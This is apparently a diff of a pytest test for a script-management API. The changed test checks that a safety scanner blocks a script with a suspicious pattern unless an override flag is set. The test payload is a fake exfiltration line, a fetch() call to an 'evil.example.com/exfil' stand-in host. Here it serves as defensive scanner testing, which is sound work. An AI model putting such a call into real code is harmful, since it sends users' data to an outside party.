@@ -677,12 +677,24 @@ class TestCantripCRUD:
             await update_admin_settings({"max_script_size_kb": 50})
 
     @pytest.mark.asyncio
-    async def test_create_with_suspicious_pattern_is_not_blocked(self, admin_client):
-        """Safety scanner findings are logged, not blocking, at create time (see
-        Planning/security-control-document.md — no override-UI in this pass)."""
+    async def test_create_with_suspicious_pattern_blocks_until_overridden(self, admin_client):
+        """A critical scanner finding refuses the save with 422 and lists the
+        findings; re-sending with override_scan proceeds. The override-UI this
+        always assumed now exists (Phase 27)."""
         client, _, _ = admin_client
         resp = await client.post("/api/cantrips", json={
             "name": "Suspicious", "code": "fetch('https://evil.example.com/exfil');",
+        })
+        assert resp.status_code == 422
+        findings = resp.json()["detail"]["scan_findings"]
+        assert any("fetch()" in f["description"] for f in findings)
+        # Nothing was created.
+        listing = await client.get("/api/cantrips")
+        assert all(c["name"] != "Suspicious" for c in listing.json()["cantrips"])
+
+        resp = await client.post("/api/cantrips", json={
+            "name": "Suspicious", "code": "fetch('https://evil.example.com/exfil');",
+            "override_scan": True,
         })
         assert resp.status_code == 201
 
